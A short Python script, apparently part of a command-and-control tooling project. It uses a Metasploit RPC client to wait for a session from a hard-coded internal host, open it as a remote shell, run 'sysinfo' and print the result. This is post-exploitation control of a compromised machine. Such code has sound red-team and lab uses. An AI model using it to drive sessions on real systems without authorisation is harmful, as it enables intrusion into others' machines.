from time import sleep
from c2_settings import MSF_SERVER, MSF_PWD
from pymetasploit.msfrpc import MsfRpcClient
from stage2.external_c2 import msf_wait_for_session

client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
id = msf_wait_for_session.run(client, '172.30.1.83')
shell = client.sessions.session(id)
shell.write('sysinfo')
sleep(5)
print(shell.read())

pass # for breakpoint